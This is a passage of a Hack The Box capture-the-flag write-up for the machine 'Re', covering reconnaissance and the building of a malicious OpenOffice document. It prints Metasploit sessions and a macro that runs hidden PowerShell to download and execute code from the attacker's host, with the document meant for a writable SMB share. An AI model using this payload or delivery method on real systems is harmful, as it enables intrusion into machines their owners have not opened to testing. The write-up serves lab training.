<!doctype html><html lang=en><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="ie=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=author content="[map[name:MindYourPrivacy]]"><meta name=description content="Exploit powershell automation by uploading a malicious office document in an SMB share. Evade Yara rules with poweshell obfuscation. Exploit XXE on ghidra to obain user hash in responder that we break with hashcat. Some very interesting unintended exploitation path to explore."><meta name=keywords content=",ASP.Net,openoffice,macro,metasploit,hta_server,powershell,smb,obfuscation,nishang,yara,evil-winrar,ghidra,XXE,responder,impacket,hashcat,securestring,winPeas,PowerUp,SharpUp,ServiceAbuse,advfirewall,sysinternals,evil-winrm,chisel,Diaghub,zipslip"><meta name=robots content="noodp"><meta name=theme-color content><link rel=canonical href=https://0xade1.github.io/posts/2020/02/htb-re/><title>HTB - Re :: Poney Island — Welcome to Pwnie Island</title><link rel=stylesheet href=https://0xade1.github.io/main.cd71908e0ee72a8733aeb9216405d664d48b2598bb3b750ec082bbf1b5b458cc.css integrity="sha256-zXGQjg7nKoczrrkhZAXWZNSLJZi7O3UOwIK78bW0WMw="><link rel=apple-touch-icon sizes=180x180 href=https://0xade1.github.io/apple-touch-icon.png><link rel=icon type=image/png sizes=32x32 href=https://0xade1.github.io/favicon-32x32.png><link rel=icon type=image/png sizes=16x16 href=https://0xade1.github.io/favicon-16x16.png><link rel=manifest href=https://0xade1.github.io/site.webmanifest><link rel=mask-icon href=https://0xade1.github.io/safari-pinned-tab.svg color><link rel="shortcut icon" href=https://0xade1.github.io/favicon.ico><meta name=msapplication-TileColor content><meta itemprop=name content="HTB - Re"><meta itemprop=description content="Exploit powershell automation by uploading a malicious office document in an SMB share. Evade Yara rules with poweshell obfuscation. Exploit XXE on ghidra to obain user hash in responder that we break with hashcat. Some very interesting unintended exploitation path to explore."><meta itemprop=datePublished content="2020-02-20T00:54:12+08:00"><meta itemprop=dateModified content="2020-02-20T00:54:12+08:00"><meta itemprop=wordCount content="5311"><meta itemprop=image content="https://0xade1.github.io"><meta itemprop=keywords content="ASP.Net,openoffice,macro,metasploit,hta_server,powershell,smb,obfuscation,nishang,yara,evil-winrar,ghidra,XXE,responder,impacket,hashcat,securestring,winPeas,PowerUp,SharpUp,ServiceAbuse,advfirewall,sysinternals,evil-winrm,chisel,Diaghub,zipslip,"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://0xade1.github.io"><meta name=twitter:title content="HTB - Re"><meta name=twitter:description content="Exploit powershell automation by uploading a malicious office document in an SMB share. Evade Yara rules with poweshell obfuscation. Exploit XXE on ghidra to obain user hash in responder that we break with hashcat. Some very interesting unintended exploitation path to explore."><meta property="og:title" content="HTB - Re"><meta property="og:description" content="Exploit powershell automation by uploading a malicious office document in an SMB share. Evade Yara rules with poweshell obfuscation. Exploit XXE on ghidra to obain user hash in responder that we break with hashcat. Some very interesting unintended exploitation path to explore."><meta property="og:type" content="article"><meta property="og:url" content="https://0xade1.github.io/posts/2020/02/htb-re/"><meta property="og:image" content="https://0xade1.github.io"><meta property="article:section" content="posts"><meta property="article:published_time" content="2020-02-20T00:54:12+08:00"><meta property="article:modified_time" content="2020-02-20T00:54:12+08:00"><meta property="og:see_also" content="https://0xade1.github.io/posts/2021/09/htb-sink/"><meta property="og:see_also" content="https://0xade1.github.io/posts/2021/09/htb-validation/"><meta property="og:see_also" content="https://0xade1.github.io/posts/2021/09/htb-unobtainium/"><meta property="og:see_also" content="https://0xade1.github.io/posts/2021/09/htb-crossfittwo/"><meta property="og:see_also" content="https://0xade1.github.io/posts/2021/09/htb-gobox/"><meta property="og:see_also" content="https://0xade1.github.io/posts/2021/09/htb-knife/"><meta property="article:section" content="htb-windows"><meta property="article:published_time" content="2020-02-20 00:54:12 +0800 +0800"></head><body><div class=container><header class=header><span class=header__inner><a href=https://0xade1.github.io/ style=text-decoration:none><div class=logo><span class=logo__mark>></span>
<span class=logo__text># cd /root/</span>
<span class=logo__cursor></span></div></a><span class=header__right><nav class=menu><ul class=menu__inner><li><a href=https://0xade1.github.io/about/>About</a></li><li><a href=https://0xade1.github.io/categories/>Categories</a></li><li><a href=https://0xade1.github.io/posts/>Posts</a></li><li><a href=https://0xade1.github.io/series/>Series</a></li><li><a href=https://0xade1.github.io/tags/>Tags</a></li></ul></nav><span class=menu-trigger><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M0 0h24v24H0z" fill="none"/><path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/></svg></span><span class="theme-toggle not-selectable"><svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M22 41c10.4934.0 19-8.5066 19-19C41 11.5066 32.4934 3 22 3 11.5066 3 3 11.5066 3 22s8.5066 19 19 19zM7 22C7 13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22z"/></svg></span></span></span></header><div class=content><main class=post><div class=post-info><p></p></div><article><h1 class=post-title><a href=https://0xade1.github.io/posts/2020/02/htb-re/>HTB - Re</a></h1><div class=post-info><p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-tag meta-icon"><path d="M20.59 13.41l-7.17 7.17a2 2 0 01-2.83.0L2 12V2h10l8.59 8.59a2 2 0 010 2.82z"/><line x1="7" y1="7" x2="7" y2="7"/></svg><span class=tag><a href=https://0xade1.github.io/tags/asp.net/>ASP.Net</a></span>
<span class=tag><a href=https://0xade1.github.io/tags/openoffice/>openoffice</a></span>
<span class=tag><a href=https://0xade1.github.io/tags/macro/>macro</a></span>
<span class=tag><a href=https://0xade1.github.io/tags/metasploit/>metasploit</a></span>
<span class=tag><a href=https://0xade1.github.io/tags/hta_server/>hta_server</a></span>
<span class=tag><a href=https://0xade1.github.io/tags/powershell/>powershell</a></span>
<span class=tag><a href=https://0xade1.github.io/tags/smb/>smb</a></span>
<span class=tag><a href=https://0xade1.github.io/tags/obfuscation/>obfuscation</a></span>
<span class=tag><a href=https://0xade1.github.io/tags/nishang/>nishang</a></span>
<span class=tag><a href=https://0xade1.github.io/tags/yara/>yara</a></span>
<span class=tag><a href=https://0xade1.github.io/tags/evil-winrar/>evil-winrar</a></span>
<span class=tag><a href=https://0xade1.github.io/tags/ghidra/>ghidra</a></span>
<span class=tag><a href=https://0xade1.github.io/tags/xxe/>XXE</a></span>
<span class=tag><a href=https://0xade1.github.io/tags/responder/>responder</a></span>
<span class=tag><a href=https://0xade1.github.io/tags/impacket/>impacket</a></span>
<span class=tag><a href=https://0xade1.github.io/tags/hashcat/>hashcat</a></span>
<span class=tag><a href=https://0xade1.github.io/tags/securestring/>securestring</a></span>
<span class=tag><a href=https://0xade1.github.io/tags/winpeas/>winPeas</a></span>
<span class=tag><a href=https://0xade1.github.io/tags/powerup/>PowerUp</a></span>
<span class=tag><a href=https://0xade1.github.io/tags/sharpup/>SharpUp</a></span>
<span class=tag><a href=https://0xade1.github.io/tags/serviceabuse/>ServiceAbuse</a></span>
<span class=tag><a href=https://0xade1.github.io/tags/advfirewall/>advfirewall</a></span>
<span class=tag><a href=https://0xade1.github.io/tags/sysinternals/>sysinternals</a></span>
<span class=tag><a href=https://0xade1.github.io/tags/evil-winrm/>evil-winrm</a></span>
<span class=tag><a href=https://0xade1.github.io/tags/chisel/>chisel</a></span>
<span class=tag><a href=https://0xade1.github.io/tags/diaghub/>Diaghub</a></span>
<span class=tag><a href=https://0xade1.github.io/tags/zipslip/>zipslip</a></span></p></div><div class=post-excerpt>Exploit powershell automation by uploading a malicious office document in an SMB share. Evade Yara rules with poweshell obfuscation. Exploit XXE on ghidra to obain user hash in responder that we break with hashcat. Some very interesting unintended exploitation path to explore.</div><figure class=post-cover><img src=https://www.hackthebox.eu/images/logo-htb.svg alt="HTB - Re"></figure><div class=post-content><h1 id=reconnaissance>RECONNAISSANCE</h1><p>Only two ports open: http 80 and smb 445</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span><span style=color:#6272a4># Nmap 7.60 scan initiated Mon Feb 10 13:23:35 2020 as: nmap -sC -sV -oA nmap/RE 10.10.10.144</span>
</span></span><span style=display:flex><span>Nmap scan report <span style=color:#ff79c6>for</span> re.htb <span style=color:#ff79c6>(</span>10.10.10.144<span style=color:#ff79c6>)</span>
</span></span><span style=display:flex><span>Host is up <span style=color:#ff79c6>(</span>0.16s latency<span style=color:#ff79c6>)</span>.
</span></span><span style=display:flex><span>Not shown: <span style=color:#bd93f9>998</span> filtered ports
</span></span><span style=display:flex><span>PORT    STATE SERVICE       VERSION
</span></span><span style=display:flex><span>80/tcp  open  http          Microsoft IIS httpd 10.0
</span></span><span style=display:flex><span>| http-methods:
</span></span><span style=display:flex><span>|_  Potentially risky methods: TRACE
</span></span><span style=display:flex><span>|_http-server-header: Microsoft-IIS/10.0
</span></span><span style=display:flex><span>|_http-title: Ghidra Dropbox Coming Soon!
</span></span><span style=display:flex><span>445/tcp open  microsoft-ds?
</span></span><span style=display:flex><span>Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Host script results:
</span></span><span style=display:flex><span>| smb2-security-mode:
</span></span><span style=display:flex><span>|   2.02:
</span></span><span style=display:flex><span>|_    Message signing enabled but not required
</span></span><span style=display:flex><span>| smb2-time:
</span></span><span style=display:flex><span>|   date: 2020-02-10 14:23:49
</span></span><span style=display:flex><span>|_  start_date: 1601-01-01 00:00:00
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span style=display:flex><span><span style=color:#6272a4># Nmap done at Mon Feb 10 13:24:42 2020 -- 1 IP address (1 host up) scanned in 67.35 seconds</span>
</span></span></code></pre></div><p>Exploring port the webserver, redirects us to <a href=http://reblog.htb>http://reblog.htb</a>, so we edit out /etc/hosts with a new line: <code>10.10.10.144 reblog.htb</code>.
We can now navigate the website and learn from many interesting blog posts about obfuscation and exploitation techniques.
It mentions that the SOC is hosting a dropbox for automated malware analysis. If somehow we manage to put some malware scripts;
it may execute if not detected by the SOC ;)</p><p>Let&rsquo;s have a look at the samba share on port 445</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>smbclient -L //10.10.10.144
</span></span><span style=display:flex><span>WARNING: The <span style=color:#f1fa8c>&#34;syslog&#34;</span> option is deprecated
</span></span><span style=display:flex><span>Enter WORKGROUP<span style=color:#f1fa8c>\c</span>tf&#39;s password:
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>         Sharename       Type      Comment
</span></span><span style=display:flex><span>        ---------       ----      -------
</span></span><span style=display:flex><span>        IPC$            IPC       Remote IPC
</span></span><span style=display:flex><span>        malware_dropbox Disk
</span></span></code></pre></div><p>Further exploration of the malware_dropbox folder shows we are able to write a file</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>ctf@15bec4805337:~/htb$ smbclient //reblog.htb/malware_dropbox
</span></span><span style=display:flex><span>WARNING: The <span style=color:#f1fa8c>&#34;syslog&#34;</span> option is deprecated
</span></span><span style=display:flex><span>Enter WORKGROUP<span style=color:#f1fa8c>\c</span>tf&#39;s password:
</span></span><span style=display:flex><span>Try <span style=color:#f1fa8c>&#34;help&#34;</span> to get a list of possible commands.
</span></span><span style=display:flex><span>smb: <span style=color:#f1fa8c>\&gt;</span> ls
</span></span><span style=display:flex><span>  .                                   D        <span style=color:#bd93f9>0</span>  Tue Jun <span style=color:#bd93f9>18</span> 21:08:36 <span style=color:#bd93f9>2019</span>
</span></span><span style=display:flex><span>  ..                                  D        <span style=color:#bd93f9>0</span>  Tue Jun <span style=color:#bd93f9>18</span> 21:08:36 <span style=color:#bd93f9>2019</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>                <span style=color:#bd93f9>8247551</span> blocks of size 4096. <span style=color:#bd93f9>4293985</span> blocks available
</span></span><span style=display:flex><span>smb: <span style=color:#f1fa8c>\&gt;</span> put test.txt test.txt
</span></span><span style=display:flex><span>putting file test.txt as <span style=color:#f1fa8c>\t</span>est.txt <span style=color:#ff79c6>(</span>0.0 kb/s<span style=color:#ff79c6>)</span> <span style=color:#ff79c6>(</span>average 0.0 kb/s<span style=color:#ff79c6>)</span>
</span></span><span style=display:flex><span>smb: <span style=color:#f1fa8c>\&gt;</span> ls
</span></span><span style=display:flex><span>  .                                   D        <span style=color:#bd93f9>0</span>  Thu Feb <span style=color:#bd93f9>13</span> 17:15:02 <span style=color:#bd93f9>2020</span>
</span></span><span style=display:flex><span>  ..                                  D        <span style=color:#bd93f9>0</span>  Thu Feb <span style=color:#bd93f9>13</span> 17:15:02 <span style=color:#bd93f9>2020</span>
</span></span><span style=display:flex><span>  test.txt                            A        <span style=color:#bd93f9>5</span>  Thu Feb <span style=color:#bd93f9>13</span> 17:15:02 <span style=color:#bd93f9>2020</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>                <span style=color:#bd93f9>8247551</span> blocks of size 4096. <span style=color:#bd93f9>4293985</span> blocks available
</span></span><span style=display:flex><span>smb: <span style=color:#f1fa8c>\&gt;</span>
</span></span></code></pre></div><p>Eploring the website, we observe the source code of <a href=http://reblog.htb>http://reblog.htb</a> which is a static website</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-html data-lang=html><span style=display:flex><span><span style=color:#6272a4>&lt;!-- Begin Jekyll SEO tag v2.5.0 --&gt;</span>
</span></span></code></pre></div><p>However exploration of the http header shows us that the site is running ASP.NET: <code>X-Powered-By ASP.NET</code></p><h1 id=weaponization>WEAPONIZATION</h1><p>We use MSF msfconsole to weaponize a file that we will put on the malware_dropbox</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>msf5 &gt; spool msf.log
</span></span><span style=display:flex><span><span style=color:#ff79c6>[</span>*<span style=color:#ff79c6>]</span> Spooling to file msf.log...
</span></span><span style=display:flex><span>msf5 &gt; search openoffice
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Matching <span style=color:#8be9fd;font-style:italic>Modules</span>
</span></span><span style=display:flex><span><span style=color:#ff79c6>================</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>   <span style=color:#6272a4>#  Name                                          Disclosure Date  Rank       Check  Description</span>
</span></span><span style=display:flex><span>   -  ----                                          ---------------  ----       -----  -----------
</span></span><span style=display:flex><span>   <span style=color:#bd93f9>0</span>  auxiliary/fileformat/odt_badodt               2018-05-01       normal     No     LibreOffice 6.03 /Apache OpenOffice 4.1.5 Malicious ODT File Generator
</span></span><span style=display:flex><span>   <span style=color:#bd93f9>1</span>  exploit/multi/misc/openoffice_document_macro  2017-02-08       excellent  No     Apache OpenOffice Text Document Malicious Macro Execution
</span></span><span style=display:flex><span>   <span style=color:#bd93f9>2</span>  exploit/windows/fileformat/openoffice_ole     2008-04-17       normal     No     OpenOffice OLE Importer DocumentSummaryInformation Stream Handling Overflow
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>msf5 &gt; use exploit/multi/misc/openoffice_document_macro
</span></span><span style=display:flex><span>msf5 exploit<span style=color:#ff79c6>(</span>multi/misc/openoffice_document_macro<span style=color:#ff79c6>)</span> &gt; options
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Module options <span style=color:#ff79c6>(</span>exploit/multi/misc/openoffice_document_macro<span style=color:#ff79c6>)</span>:
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>   Name      Current Setting  Required  Description
</span></span><span style=display:flex><span>   ----      ---------------  --------  -----------
</span></span><span style=display:flex><span>   BODY                       no        The message <span style=color:#ff79c6>for</span> the document body
</span></span><span style=display:flex><span>   FILENAME  msf.odt          yes       The OpoenOffice Text document name
</span></span><span style=display:flex><span>   SRVHOST   0.0.0.0          yes       The <span style=color:#8be9fd;font-style:italic>local</span> host to listen on. This must be an address on the <span style=color:#8be9fd;font-style:italic>local</span> machine or 0.0.0.0
</span></span><span style=display:flex><span>   SRVPORT   <span style=color:#bd93f9>8080</span>             yes       The <span style=color:#8be9fd;font-style:italic>local</span> port to listen on.
</span></span><span style=display:flex><span>   SSL       <span style=color:#8be9fd;font-style:italic>false</span>            no        Negotiate SSL <span style=color:#ff79c6>for</span> incoming connections
</span></span><span style=display:flex><span>   SSLCert                    no        Path to a custom SSL certificate <span style=color:#ff79c6>(</span>default is randomly generated<span style=color:#ff79c6>)</span>
</span></span><span style=display:flex><span>   URIPATH                    no        The URI to use <span style=color:#ff79c6>for</span> this exploit <span style=color:#ff79c6>(</span>default is random<span style=color:#ff79c6>)</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Exploit target:
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>   Id  Name
</span></span><span style=display:flex><span>   --  ----
</span></span><span style=display:flex><span>   <span style=color:#bd93f9>0</span>   Apache OpenOffice on Windows <span style=color:#ff79c6>(</span>PSH<span style=color:#ff79c6>)</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>msf5 exploit<span style=color:#ff79c6>(</span>multi/misc/openoffice_document_macro<span style=color:#ff79c6>)</span> &gt; <span style=color:#8be9fd;font-style:italic>set</span> BODY this is a <span style=color:#8be9fd;font-style:italic>test</span>
</span></span><span style=display:flex><span><span style=color:#8be9fd;font-style:italic>BODY</span> <span style=color:#ff79c6>=</span>&gt; this is a <span style=color:#8be9fd;font-style:italic>test</span>
</span></span><span style=display:flex><span>msf5 exploit<span style=color:#ff79c6>(</span>multi/misc/openoffice_document_macro<span style=color:#ff79c6>)</span> &gt; <span style=color:#8be9fd;font-style:italic>set</span> SRVHOST 127.0.0.1
</span></span><span style=display:flex><span><span style=color:#8be9fd;font-style:italic>SRVHOST</span> <span style=color:#ff79c6>=</span>&gt; 127.0.0.1
</span></span><span style=display:flex><span>msf5 exploit<span style=color:#ff79c6>(</span>multi/misc/openoffice_document_macro<span style=color:#ff79c6>)</span> &gt; <span style=color:#8be9fd;font-style:italic>set</span> LHOST 10.10.14.73
</span></span><span style=display:flex><span><span style=color:#8be9fd;font-style:italic>LHOST</span> <span style=color:#ff79c6>=</span>&gt; 10.10.14.73
</span></span><span style=display:flex><span>msf5 exploit<span style=color:#ff79c6>(</span>multi/misc/openoffice_document_macro<span style=color:#ff79c6>)</span> &gt; <span style=color:#8be9fd;font-style:italic>set</span> LPORT <span style=color:#bd93f9>8000</span>
</span></span><span style=display:flex><span><span style=color:#8be9fd;font-style:italic>LPORT</span> <span style=color:#ff79c6>=</span>&gt; <span style=color:#bd93f9>8000</span>
</span></span><span style=display:flex><span>msf5 exploit<span style=color:#ff79c6>(</span>multi/misc/openoffice_document_macro<span style=color:#ff79c6>)</span> &gt; show options
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Module options <span style=color:#ff79c6>(</span>exploit/multi/misc/openoffice_document_macro<span style=color:#ff79c6>)</span>:
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>   Name      Current Setting  Required  Description
</span></span><span style=display:flex><span>   ----      ---------------  --------  -----------
</span></span><span style=display:flex><span>   BODY      this is a <span style=color:#8be9fd;font-style:italic>test</span>   no        The message <span style=color:#ff79c6>for</span> the document body
</span></span><span style=display:flex><span>   FILENAME  msf.odt          yes       The OpoenOffice Text document name
</span></span><span style=display:flex><span>   SRVHOST   127.0.0.1        yes       The <span style=color:#8be9fd;font-style:italic>local</span> host to listen on. This must be an address on the <span style=color:#8be9fd;font-style:italic>local</span> machine or 0.0.0.0
</span></span><span style=display:flex><span>   SRVPORT   <span style=color:#bd93f9>8080</span>             yes       The <span style=color:#8be9fd;font-style:italic>local</span> port to listen on.
</span></span><span style=display:flex><span>   SSL       <span style=color:#8be9fd;font-style:italic>false</span>            no        Negotiate SSL <span style=color:#ff79c6>for</span> incoming connections
</span></span><span style=display:flex><span>   SSLCert                    no        Path to a custom SSL certificate <span style=color:#ff79c6>(</span>default is randomly generated<span style=color:#ff79c6>)</span>
</span></span><span style=display:flex><span>   URIPATH                    no        The URI to use <span style=color:#ff79c6>for</span> this exploit <span style=color:#ff79c6>(</span>default is random<span style=color:#ff79c6>)</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Payload options <span style=color:#ff79c6>(</span>windows/meterpreter/reverse_tcp<span style=color:#ff79c6>)</span>:
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>   Name      Current Setting  Required  Description
</span></span><span style=display:flex><span>   ----      ---------------  --------  -----------
</span></span><span style=display:flex><span>   EXITFUNC  thread           yes       Exit technique <span style=color:#ff79c6>(</span>Accepted: <span style=color:#f1fa8c>&#39;&#39;</span>, seh, thread, process, none<span style=color:#ff79c6>)</span>
</span></span><span style=display:flex><span>   LHOST     10.10.14.73      yes       The listen address <span style=color:#ff79c6>(</span>an interface may be specified<span style=color:#ff79c6>)</span>
</span></span><span style=display:flex><span>   LPORT     <span style=color:#bd93f9>8000</span>             yes       The listen port
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Exploit target:
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>   Id  Name
</span></span><span style=display:flex><span>   --  ----
</span></span><span style=display:flex><span>   <span style=color:#bd93f9>0</span>   Apache OpenOffice on Windows <span style=color:#ff79c6>(</span>PSH<span style=color:#ff79c6>)</span>
</span></span><span style=display:flex><span>msf5 exploit<span style=color:#ff79c6>(</span>multi/misc/openoffice_document_macro<span style=color:#ff79c6>)</span> &gt; run
</span></span><span style=display:flex><span><span style=color:#ff79c6>[</span>*<span style=color:#ff79c6>]</span> Exploit running as background job 4.
</span></span><span style=display:flex><span><span style=color:#ff79c6>[</span>*<span style=color:#ff79c6>]</span> Exploit completed, but no session was created.
</span></span><span style=display:flex><span>msf5 exploit<span style=color:#ff79c6>(</span>multi/misc/openoffice_document_macro<span style=color:#ff79c6>)</span> &gt;
</span></span><span style=display:flex><span><span style=color:#ff79c6>[</span>-<span style=color:#ff79c6>]</span> Handler failed to <span style=color:#8be9fd;font-style:italic>bind</span> to 10.10.14.73:8000:-  -
</span></span><span style=display:flex><span><span style=color:#ff79c6>[</span>*<span style=color:#ff79c6>]</span> Started reverse TCP handler on 0.0.0.0:8000
</span></span><span style=display:flex><span><span style=color:#ff79c6>[</span>*<span style=color:#ff79c6>]</span> Using URL: http://127.0.0.1:8080/73nAC2i7xc
</span></span><span style=display:flex><span><span style=color:#ff79c6>[</span>*<span style=color:#ff79c6>]</span> Server started.
</span></span><span style=display:flex><span><span style=color:#ff79c6>[</span>*<span style=color:#ff79c6>]</span> Generating our odt file <span style=color:#ff79c6>for</span> Apache OpenOffice on Windows <span style=color:#ff79c6>(</span>PSH<span style=color:#ff79c6>)</span>...
</span></span><span style=display:flex><span><span style=color:#ff79c6>[</span>*<span style=color:#ff79c6>]</span> Packaging directory: /opt/metasploit-framework/embedded/framework/data/exploits/openoffice_document_macro/Basic
</span></span><span style=display:flex><span><span style=color:#ff79c6>[</span>*<span style=color:#ff79c6>]</span> Packaging directory: /opt/metasploit-framework/embedded/framework/data/exploits/openoffice_document_macro/Basic/Standard
</span></span><span style=display:flex><span><span style=color:#ff79c6>[</span>*<span style=color:#ff79c6>]</span> Packaging file: Basic/Standard/Module1.xml
</span></span><span style=display:flex><span><span style=color:#ff79c6>[</span>*<span style=color:#ff79c6>]</span> Packaging file: Basic/Standard/script-lb.xml
</span></span><span style=display:flex><span><span style=color:#ff79c6>[</span>*<span style=color:#ff79c6>]</span> Packaging file: Basic/script-lc.xml
</span></span><span style=display:flex><span><span style=color:#ff79c6>[</span>*<span style=color:#ff79c6>]</span> Packaging file: content.xml
</span></span><span style=display:flex><span><span style=color:#ff79c6>[</span>*<span style=color:#ff79c6>]</span> Packaging directory: /opt/metasploit-framework/embedded/framework/data/exploits/openoffice_document_macro/META-INF
</span></span><span style=display:flex><span><span style=color:#ff79c6>[</span>*<span style=color:#ff79c6>]</span> Packaging file: META-INF/manifest.xml
</span></span><span style=display:flex><span><span style=color:#ff79c6>[</span>*<span style=color:#ff79c6>]</span> Packaging file: mimetype
</span></span><span style=display:flex><span><span style=color:#ff79c6>[</span>*<span style=color:#ff79c6>]</span> Packaging file: meta.xml
</span></span><span style=display:flex><span><span style=color:#ff79c6>[</span>*<span style=color:#ff79c6>]</span> Packaging directory: /opt/metasploit-framework/embedded/framework/data/exploits/openoffice_document_macro/Thumbnails
</span></span><span style=display:flex><span><span style=color:#ff79c6>[</span>*<span style=color:#ff79c6>]</span> Packaging file: Thumbnails/thumbnail.png
</span></span><span style=display:flex><span><span style=color:#ff79c6>[</span>*<span style=color:#ff79c6>]</span> Packaging file: styles.xml
</span></span><span style=display:flex><span><span style=color:#ff79c6>[</span>*<span style=color:#ff79c6>]</span> Packaging file: manifest.rdf
</span></span><span style=display:flex><span><span style=color:#ff79c6>[</span>*<span style=color:#ff79c6>]</span> Packaging directory: /opt/metasploit-framework/embedded/framework/data/exploits/openoffice_document_macro/Configurations2
</span></span><span style=display:flex><span><span style=color:#ff79c6>[</span>*<span style=color:#ff79c6>]</span> Packaging directory: /opt/metasploit-framework/embedded/framework/data/exploits/openoffice_document_macro/Configurations2/accelerator
</span></span><span style=display:flex><span><span style=color:#ff79c6>[</span>*<span style=color:#ff79c6>]</span> Packaging file: Configurations2/accelerator/current.xml
</span></span><span style=display:flex><span><span style=color:#ff79c6>[</span>*<span style=color:#ff79c6>]</span> Packaging file: settings.xml
</span></span><span style=display:flex><span><span style=color:#ff79c6>[</span>+<span style=color:#ff79c6>]</span> msf.odt stored at /home/ctf/.msf4/local/msf.odt
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>msf5 exploit<span style=color:#ff79c6>(</span>multi/misc/openoffice_document_macro<span style=color:#ff79c6>)</span> &gt; quit
</span></span></code></pre></div><p>We now need to edit our evil macro with the address and port of our local machine. We can explode the zip file and overwrite the macro module:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>ctf@15bec4805337:~/htb$ cp /home/ctf/.msf4/local/msf2.odt .
</span></span><span style=display:flex><span>ctf@15bec4805337:~/htb$ unzip msf2.odt -d weapon
</span></span><span style=display:flex><span>ctf@15bec4805337:~/htb$ find weapon/ | grep -i module
</span></span><span style=display:flex><span>weapon/Basic/Standard/Module1.xml
</span></span><span style=display:flex><span>ctf@15bec4805337:~/htb$ vi weapon/Basic/Standard/Module1.xml
</span></span><span style=display:flex><span>ctf@15bec4805337:~/htb$ cat weapon/Basic/Standard/Module1.xml
</span></span><span style=display:flex><span>&lt;?xml <span style=color:#8be9fd;font-style:italic>version</span><span style=color:#ff79c6>=</span><span style=color:#f1fa8c>&#34;1.0&#34;</span> <span style=color:#8be9fd;font-style:italic>encoding</span><span style=color:#ff79c6>=</span><span style=color:#f1fa8c>&#34;UTF-8&#34;</span>?&gt;
</span></span><span style=display:flex><span><span style=color:#ff79c6>[</span>...<span style=color:#ff79c6>]</span>
</span></span><span style=display:flex><span>    Sub Exploit
</span></span><span style=display:flex><span>      Shell<span style=color:#ff79c6>(</span>&amp;quot;cmd.exe /C &amp;quot;&amp;quot;powershell.exe -nop -w hidden -c <span style=color:#8be9fd;font-style:italic>$j</span><span style=color:#ff79c6>=</span>new-object net.webclient;<span style=color:#ff79c6>if</span><span style=color:#ff79c6>([</span>System.Net.WebProxy<span style=color:#ff79c6>]</span>::GetDefaultProxy<span style=color:#ff79c6>()</span>.address -ne <span style=color:#8be9fd;font-style:italic>$null</span><span style=color:#ff79c6>){</span><span style=color:#8be9fd;font-style:italic>$j</span>.proxy<span style=color:#ff79c6>=[</span>Net.WebRequest<span style=color:#ff79c6>]</span>::GetSystemWebProxy<span style=color:#ff79c6>()</span>;<span style=color:#8be9fd;font-style:italic>$j</span>.Proxy.Credentials<span style=color:#ff79c6>=[</span>Net.CredentialCache<span style=color:#ff79c6>]</span>::DefaultCredentials;<span style=color:#ff79c6>}</span>;IEX <span style=color:#ff79c6>((</span>new-object Net.WebClient<span style=color:#ff79c6>)</span>.DownloadString<span style=color:#ff79c6>(</span>&amp;<span style=color:#6272a4>#39;http://10.10.14.73:8080/Sleo5QXcLanq&amp;#39;));&amp;quot;&amp;quot;&amp;quot;)</span>
</span></span><span style=display:flex><span>    End Sub
</span></span><span style=display:flex><span><span style=color:#ff79c6>[</span>...<span style=color:#ff79c6>]</span>
</span></span><span style=display:flex><span>ctf@a354c88a22ac:~/htb$ <span style=color:#8be9fd;font-style:italic>cd</span> weapon
</span></span><span style=display:flex><span>ctf@a354c88a22ac:~/htb/weapon$ zip -r malicious.odt ./*
</span></span><span style=display:flex><span>ctf@a354c88a22ac:~/htb/weapon$ mv malicious.odt ..
</span></span></code></pre></div><p>We can now focus on the server side of the exploit by spinning of a malicious HTA Web server.
However as we are using a docker container running on Mac, we have first to forward few ports
